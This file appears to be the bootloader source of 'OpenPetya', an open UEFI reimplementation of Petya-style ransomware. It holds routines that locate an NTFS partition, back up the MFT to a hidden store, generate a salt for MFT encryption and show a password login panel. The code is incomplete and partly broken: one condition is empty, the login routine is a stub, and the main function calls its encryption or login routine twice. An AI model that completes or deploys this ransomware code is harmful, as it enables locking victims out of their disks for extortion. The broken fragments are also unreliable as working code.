// bootloader.c

#include <efi.h>
#include <efilib.h>

#include "ntfs.h"
#include "ntfs_crypt.h"
#include "state.h"
#include "hidden_store.h"

#define MAX_ATTEMPTS 3
#define MAX_PW_LEN 32

void clear(EFI_SYSTEM_TABLE *systab)
{
    systab->ConOut->ClearScreen(systab->ConOut);
}

void set_color(EFI_SYSTEM_TABLE *systab, UINT16 color)
{
    systab->ConOut->SetAttribute(systab->ConOut, color);
}

void zero_buffer(char *buffer, int len)
{
    for (int i = 0; i < len; i++)
        buffer[i] = 0;
}

void readline(EFI_SYSTEM_TABLE *systab, CHAR16 *buffer, UINTN max)
{
    UINTN i = 0;
    EFI_INPUT_KEY key;
    EFI_STATUS status;
    UINTN idx;

    // initialize the buffer to be an empty string
    buffer[0] = L'\0';

    while (i < max - 1)
    {
        systab->BootServices->WaitForEvent(1, &systab->ConIn->WaitForKey, &idx);
        status = systab->ConIn->ReadKeyStroke(systab->ConIn, &key);
        if (status != EFI_SUCCESS)
            continue;

        if (key.UnicodeChar == L'\r' || key.UnicodeChar == L'\n')
        {
            CHAR16 newline[] = {
                L'\r',
                L'\n',
                L'\0',
            };
            systab->ConOut->OutputString(systab->ConOut, newline);
            break;
        }

        // handle backspace
        if (key.UnicodeChar == L'\b')
        {
            if (i > 0)
            {
                i--;
                buffer[i] = L'\0';

                // erase the character from the screen
                // in UEFI, sending a backspace moves the cursor back, but doesn't erase.
                CHAR16 erase[] = {
                    L'\b',
                    L' ',
                    L'\b',
                    L'\0',
                };
                systab->ConOut->OutputString(systab->ConOut, erase);
            }

            continue;
        }

        if (key.UnicodeChar >= 0x20)
        {
            buffer[i] = key.UnicodeChar;

            CHAR16 echo[2] = {
                key.UnicodeChar,
                L'\0',
            };
            systab->ConOut->OutputString(systab->ConOut, echo);

            i++;
        }
    }

    // null-termiante the final string
    buffer[i] = L'\0';
}

/// @brief Encrypt MFT
/// @param systab 
EFI_STATUS do_encryption(EFI_SYSTEM_TABLE *systab)
{
    clear(systab);

    uint64_t disk_size = state_read_disk_size();
    if (disk_size == 0)
    {
        Print(L"ERROR: Disk size is not set by installer.\n");
        return EFI_ABORTED;
    }

    Print(L"Detecting NTFS partition...\n");
    uint32_t partition_lba = ntfs_find_first_partitionLBA();
    if (partition_lba == 0)
    {
        set_color(systab, EFI_RED | EFI_BACKGROUND_BLACK);
        Print(L"ERROR: No NTFS partition found!\n");
        return EFI_ABORTED;
    }

    hidden_store_init(disk_size);

    if (hidden_backup_mft(partition_lba) != 0)
    {

        return EFI_ABORTED;
    }

    if (ntfs_generate_salt() != 0)
    {

        return EFI_ABORTED;
    }

    char password[65];
    if ()

    return EFI_SUCCESS;
}

/// @brief Login panel
/// @param systab 
EFI_STATUS do_login(EFI_SYSTEM_TABLE *systab)
{
    clear(systab);

    set_color(systab, EFI_BACKGROUND_BLUE | EFI_WHITE);
    
    char input[MAX_PW_LEN];
    int attempts = 3;


    return EFI_SUCCESS;
}

/// @brief main function
/// @param image 
/// @param systab 
/// @return 
EFI_STATUS efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
{
    InitializeLib(image, systab);

    set_color(systab, EFI_WHITE | EFI_BACKGROUND_BLUE);
    clear(systab);
    
    Print(L"OpenPetya (UEFI)\n\n");
    
    systab->ConOut->SetAttribute(systab->ConOut, EFI_LIGHTGRAY | EFI_BACKGROUND_BLACK);

    EFI_STATUS status = init_disk(image);
    if (EFI_ERROR(status))
    {
        Print(L"Error: Cannot find disk\n");
        return status;
    }

    UINT8 state_buffer[512];
    disk_read(60, 1, state_buffer);
    UINT32 magic = *(UINT32 *)state_buffer;
    UINT8 state = state_buffer[4];

    if (magic != 0x424F4F54)
    {
        Print(L"ERROR: State sector invalid\n");
        return EFI_NOT_FOUND;
    }

    if (state == 0x00)
        do_encryption(systab);
    else
        do_login(systab);

    return state == 0x00 ? do_encryption(systab) : do_login(systab);

    // EFI_INPUT_KEY key;
    // Print(L"Press any key to continue...\n");
    // WaitForSingleEvent(systab->ConIn->WaitForKey, 0);
    // systab->ConIn->ReadKeyStroke(systab->ConIn, &key);

    // return EFI_SUCCESS;
}